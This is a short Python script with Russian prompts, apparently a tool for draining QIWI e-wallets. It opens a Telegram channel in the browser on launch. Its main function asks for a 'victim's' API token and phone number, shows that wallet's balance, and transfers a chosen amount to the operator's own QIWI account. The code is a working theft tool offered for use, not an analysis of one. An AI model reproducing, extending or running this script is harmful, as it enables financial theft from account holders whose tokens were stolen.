import os
os.system("clear")
import random, datetime, sys, time, argparse, os, json
from colorama import Fore, Back, Style
from termcolor import colored
from SimpleQIWI import * 
import sys
from Qiwi2 import QiwiApi
import webbrowser as wb


banner = colored("""

  ___   ____  __    __  ____ 
 /   \ |    ||  |__|  ||    |
|     | |  | |  |  |  | |  | 
|  Q  | |  | |  |  |  | |  | 
|     | |  | |  `  '  | |  | 
|     | |  |  \      /  |  | 
 \__,_||____|  \_/\_/  |____| 
                    channel: https://t.me/eniac_tg
		
""", "blue")

print(banner)


wb.open("https://t.me/eniac_tg")

def check_balance():
	token=input('Введите токен: ')
	phone=input('Введите номер: ')

	api = QiwiApi(token=token, phone=phone)
	print(api.get_all_profile_info())

def withdraw_money():
	token_target=input('Введите токен жертвы: ')
	phone_target=input('Введите номер жертвы: ')

	recepient_phone=input("Введите номер киви куда отправлять деньги: ")
	amount_send = input("Введите сколько отправлять: ")

	comment_text = input("Введите комментарий: ")

	api = QiwiApi(token=token_target, phone=phone_target)
	print(api.get_balance_info())

	api.withdraw_money(account=recepient_phone, amount=int(amount_send), comment=comment_text)
	print(api.get_balance_info())


def main ():
	while True:
		print("1 - Проверить баланс!") 
		print("2 - Снять деньги по токену!") 

		question = int(input("Что вы хотите сделать: "))
		try:
			if question == 1:
				check_balance()
			elif question == 2:
				withdraw_money()
			else:
				main()
		except Exception:
			print("Упс!", sys.exc_info()[0], "случилась .\n Попробуй еще")
			main()
main()
